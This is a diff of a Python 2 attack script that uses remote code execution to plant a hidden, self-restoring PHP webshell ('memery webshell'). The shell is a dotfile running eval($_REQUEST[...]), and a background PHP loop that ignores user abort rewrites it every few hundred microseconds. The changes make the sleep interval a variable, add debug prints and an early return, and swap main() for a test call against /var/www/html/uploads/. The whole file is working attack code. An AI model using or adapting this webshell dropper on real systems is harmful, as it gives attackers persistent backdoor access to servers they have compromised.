@@ -28,10 +28,13 @@ def get_writable_dir(url, root):
     return code_exec(url, payload).split("\n")[0:-1]
 
 def write_memery_webshell(url, directory, password):
-    code = "<?php $content = '<?php eval($_REQUEST[%s]);?>'; $writable_path = '%s'; $filename = '.%s.php'; $path = $writable_path.'/'.$filename; ignore_user_abort(true); set_time_limit(0); while(true){ if(file_get_contents($path) != $content){ file_put_contents($path, $content); } usleep(500); }?>" % (password, directory, password)
+    sleep_time = 500 # micro second
+    code = "<?php $content = '<?php eval($_REQUEST[%s]);?>'; $writable_path = '%s'; $filename = '.%s.php'; $path = $writable_path.'/'.$filename; ignore_user_abort(true); set_time_limit(0); while(true){ if(file_get_contents($path) != $content){ file_put_contents($path, $content); } usleep(%d); }?>" % (password, directory, password, sleep_time)
     filename = ".%s.php" % (password)
     path = "%s/%s" % (directory, filename)
     payload = "file_put_contents('%s', base64_decode('%s'));" % (path, code.encode("base64").replace("\n", ""))
+    print payload
+    return
     return code_exec(url, payload).split("\n")[0:-1]
 
 def active_memery_webshell(url):
@@ -61,4 +64,5 @@ def main():
         active_memery_webshell(webshell_url)
 
 if __name__ == "__main__":
-    main()
+    print write_memery_webshell("","/var/www/html/uploads/","c")
+    # main()
